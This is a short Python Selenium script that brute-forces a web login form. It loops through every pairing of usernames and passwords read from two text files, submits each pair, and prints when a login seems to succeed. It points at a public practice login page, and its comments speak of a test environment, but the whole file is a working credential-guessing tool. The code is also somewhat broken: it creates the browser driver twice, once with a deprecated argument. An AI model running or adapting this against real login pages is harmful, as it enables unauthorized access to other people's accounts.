from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from selenium import webdriver

chrome_driver_path = "C:\\chromedriver\\chromedriver-win64\\chromedriver.exe"
driver = webdriver.Chrome(executable_path=chrome_driver_path)

# Path to username and password lists
username_file ="username.txt"
password_file ="password.txt"

# Target Login Page (Use a test environment)
LOGIN_URL = "https://practicetestautomation.com/practice-test-login/"  # Replace with your test site's login page

# Read usernames and passwords
with open(username_file, "r") as u_file:
    usernames = [line.strip() for line in u_file]

with open(password_file, "r") as p_file:
    passwords = [line.strip() for line in p_file]

# Set up Selenium WebDriver (Ensure ChromeDriver is installed)
driver = webdriver.Chrome()

# Open login page
driver.get(LOGIN_URL)
time.sleep(2)  # Wait for page to load

# Loop through username and password combinations
for username in usernames:
    for password in passwords:
        print(f"Trying {username} : {password}")

        try:
            # Locate input fields (Modify selectors as per your login page)
            username_field = driver.find_element(By.NAME, "username")
            password_field = driver.find_element(By.NAME, "password")
            login_button = driver.find_element(By.NAME, "login")  # Modify this selector

            # Clear previous entries
            username_field.clear()
            password_field.clear()

            # Enter username and password
            username_field.send_keys(username)
            password_field.send_keys(password)
            login_button.click()

            time.sleep(2)  # Allow time for response
            
            # Check for login failure message (Modify selector based on the page)
            error_message = driver.find_elements(By.CLASS_NAME, "error")  
            if error_message:
                print("Login failed - Capturing response")
            else:
                print("Potential successful login detected!")

        except Exception as e:
            print(f"Error occurred: {e}")

# Close the browser
driver.quit()
